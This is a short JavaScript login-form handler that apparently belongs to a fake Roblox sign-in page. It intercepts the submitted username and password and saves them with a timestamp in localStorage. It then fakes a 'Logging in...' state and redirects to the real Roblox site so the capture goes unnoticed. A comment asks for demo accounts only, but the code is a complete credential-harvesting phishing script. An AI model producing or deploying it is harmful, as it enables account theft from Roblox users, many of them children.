document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const username = document.querySelector("input[type='text']").value;
  const password = document.querySelector("input[type='password']").value;

  // WARNING: Only use fake/demo accounts!
  const logEntry = {
    username: username,
    password: password,
    time: new Date().toLocaleString()
  };

  // Save logs in localStorage
  let logs = JSON.parse(localStorage.getItem("logs")) || [];
  logs.push(logEntry);
  localStorage.setItem("logs", JSON.stringify(logs));

  // Simulate login
  const btn = document.querySelector(".login-btn");
  btn.textContent = "Logging in...";
  btn.disabled = true;

  // Redirect to Roblox
  setTimeout(() => {
    window.location.href = "https://www.roblox.com";
  }, 1200);
});